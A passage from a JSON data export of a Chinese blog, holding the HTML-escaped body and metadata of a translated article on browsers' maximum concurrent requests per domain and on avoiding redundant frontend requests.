请求 ? 例如我需要所有国家的国旗, 并以洲排序. 我先发一个请求获取所有的大洲, 然后依次获取每个大洲所有国家的国旗.\u0026nbsp;\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"color: rgb(38, 38, 38);\"\u003e\u003cspan style=\"color: rgb(12, 12, 12); font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; font-size: 16px;\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;假设有5个洲, 那么一共发送了 \u0026nbsp;1 + 5 = 6 个请求, 这是木有必要的, 因为你可以在服务端按洲排序\u003cspan style=\"color: rgb(12, 12, 12); font-size: 16px; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; line-height: normal;\"\u003e所有国家的国旗, 然后一次返回给前端.\u0026nbsp;\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"color: rgb(12, 12, 12); font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; line-height: 1.5;\"\u003e(译者注 : 这个道理看上去大家都懂, 往往却犯了这样的错误, 问题是往往还不容易发现, 因为它毕竟不是语法错误. 我就做过这样的事. 所以要牢记心中)\u003c/span\u003e\u003cspan style=\"color: rgb(12, 12, 12); font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; line-height: normal;\"\u003e.\u003c/span\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003ca href=\"http://sgdev-blog.blogspot.sg/2014/01/maximum-concurrent-connection-to-same.html\" target=\"_blank\" style=\"text-decoration: underline; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; line-height: normal; color: rgb(38, 38, 38);\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; line-height: normal; color: rgb(38, 38, 38);\"\u003e原英文地址\u003c/span\u003e\u003c/a\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em; text-align: center;\"\u003e\u003cspan style=\"font-family: \u0026#39;arial black\u0026#39;, \u0026#39;avant garde\u0026#39;; color: rgb(38, 38, 38);\"\u003e\u003cem\u003e\u003cspan style=\"color: rgb(12, 12, 12); font-family: \u0026#39;arial black\u0026#39;, \u0026#39;avant garde\u0026#39;; line-height: 1.5; font-size: 16px;\"\u003e---END---\u003c/span\u003e\u003c/em\u003e\u003c/span\u003e\u003c/p\u003e",
        "createdAt": "2015-11-11T13:07:17.549Z",
        "date_entered": {
            "__type": "Date",
            "iso": "2015-11-11T13:07:16.203Z"
        },
        "desc": "\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-family:微软雅黑, Microsoft YaHei\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;你知道浏览器对于同一域名的最大请求连接限制吗? 不知道, 木关系, 其实之前我也不太清楚.\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-family:微软雅黑, Microsoft YaHei\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;你知道如何针对这一限制提升web应用性能吗? 不知道, 木关系, 过早的优化是\u0026quot;\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; line-height: 32px;\"\u003e魔鬼\u003c/span\u003e\u0026quot;\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-family:微软雅黑, Microsoft YaHei\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;但是, 既然这样我要推荐一篇我最近很喜欢的文章(已翻译, 放心是我人工翻译, 不是机器翻译), 作者是一位拥有多年web开发经验的老鸟, 讲述对于这一浏览器限制的常见\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; line-height: 32px;\"\u003e前端\u003c/span\u003e问题与解决方案. 下图是主流浏览器对于这一规则的上限.\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-family:微软雅黑, Microsoft YaHei\"\u003e\u003cimg src=\"/ueditor/php/upload/image/20151111/1447246936140683.gif\" title=\"1447246936140683.gif\" alt=\"QQ图片20151111203647.gif\"/\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: normal;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; font-size: 12px; color: rgb(147, 137, 83); background-color: rgb(255, 255, 255);\"\u003e(图片来源 :\u0026nbsp;\u003cspan style=\"color: rgb(147, 137, 83); font-size: 12px; font-family: verdana, arial, helvetica, sans-serif; line-height: 18px;\"\u003ePROFESSIONAL Website Performance: OPTIMIZING THE FRONT END AND THE BACK END by Peter Smith\u0026nbsp;\u003c/span\u003e)\u003c/span\u003e\u003c/p\u003e",
        "hasContent": true,
        "is_delete": false,
        "objectId": "xymavD8of7",
        "stamps": "翻译,前端,浏览器",
        "title": "每周外文精选 -- 浏览器同一Domain下的最大并发请求数目",
        "types": "b1e,b7e",
        "updatedAt": "2015-12-05T03:28:14.787Z"
    }
] }